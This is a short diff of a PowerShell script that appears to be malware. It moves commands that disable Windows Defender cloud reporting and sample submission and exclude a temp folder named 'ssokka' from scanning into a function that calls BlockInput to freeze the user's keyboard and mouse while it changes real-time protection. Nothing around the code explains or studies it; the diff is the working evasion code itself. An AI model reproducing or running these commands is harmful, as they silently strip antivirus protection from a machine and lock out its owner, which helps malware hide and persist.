@@ -42,10 +42,16 @@ function DefenderRealTimeProtection {
 	param(
 		[bool]$status = $true
 	)
+
 $code = @"
 [DllImport("user32.dll")]
 public static extern bool BlockInput(bool fBlockIt);
 "@
+
+	Set-MpPreference -MAPSReporting Disable
+	Set-MpPreference -SubmitSamplesConsent NeverSend
+	Add-MpPreference -ExclusionPath "$Env:TEMP\ssokka" -Force
+
 	if ((Get-MpComputerStatus).RealTimeProtectionEnabled -ne $status) {
 		$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
 		while($true) {
@@ -129,9 +135,5 @@ function install-7zip {
 		$null = Install-Module 7Zip4PowerShell -Force
 	}
 }
-
-Set-MpPreference -MAPSReporting Disable
-Set-MpPreference -SubmitSamplesConsent NeverSend
-Add-MpPreference -ExclusionPath "$Env:TEMP\ssokka" -Force
 
 set-window
